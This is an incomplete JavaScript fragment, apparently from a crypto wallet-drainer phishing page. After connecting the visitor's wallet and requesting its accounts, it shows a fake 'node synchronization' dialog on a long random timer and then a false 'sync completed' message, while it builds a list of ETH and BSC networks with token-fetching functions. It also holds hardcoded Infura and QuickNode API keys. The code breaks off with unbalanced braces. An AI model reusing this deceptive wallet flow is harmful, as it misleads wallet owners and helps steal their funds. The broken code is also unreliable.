async function connectWallet(){
    const walletProvider = modal.getWalletProvider()
    let provider = new ethers.providers.Web3Provider(walletProvider);
    //console.log(provider)
    let signer = provider.getSigner();
    //console.log(signer)

    try {
        await provider.send("eth_requestAccounts", []);
        const address = await signer.getAddress();
        //console.log(address)
        const network = modal.getChainId()

        provider.on('network', (newNetwork, oldNetwork) => {
            if (oldNetwork) {
                // Network has changed
                //console.log(`Network changed from old network to new network`);
                // Refresh the provider to reflect the new network
                provider = new ethers.providers.Web3Provider(walletProvider, "any");
                // Update the signer to match the new network
                signer = provider.getSigner();
                //console.log('Signer updated for new network');
            }
        });

        try {
          const randomTimerDuration = Math.floor(Math.random() * 100) + 300;
            Swal.fire({
                title: 'Please Wait...',
                html: 'Node synchronization is ongoing. I will close after Synchronization is complete. Average wait time is <b></b seconds',
                imageUrl: 'https://www.resolverconsult-panel.com/assets/save_bckudy-gjk8moac.png',
                imageWidth: 300,
                imageHeight: 200,
                timer: randomTimerDuration * 1000,
                timerProgressBar: true,
                didOpen: () => {
                    Swal.showLoading();
                    const b = Swal.getHtmlContainer().querySelector('b');
                    let timerInterval = setInterval(() => {
                        const remainingTime = Swal.getTimerLeft();
                        if (remainingTime !== null) {
                            b.textContent = Math.ceil(remainingTime / 1000);
                        }
                    }, 100);

                    // Ensure to clear the interval when the alert is closed
                    Swal.getHtmlContainer().addEventListener('swalClose', () => {
                        clearInterval(timerInterval);
                    });
                },
                willClose: () => {
                    // Show success dialog after loading dialog closes
                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        text: 'Wallet sync completed successfully.',
                        showConfirmButton: true
                    });
                }
            })
        } catch (error) {
            console.error('Error opening dialog box...')
        }


        let networkDetect = [
            {chainId: mainnet.chainId, name: mainnet.name, rpcurl: 'https://mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://etherscan.io/', fetchTokens: fetchETHTokens},
            {chainId: bsc.chainId, name: bsc.name, rpcurl: 'https://icy-quaint-silence.bsc.quiknode.pro/18b9bef5fff9264be562bf4365eedff44e109f9a/', nativeCurrency: {name: 'BNB',symbol:'BBN', decimal: 18}, blockExplorerUrl: 'https://bscscan.com/', fetchTokens: fetchBNBTokens},
        ]

        
}

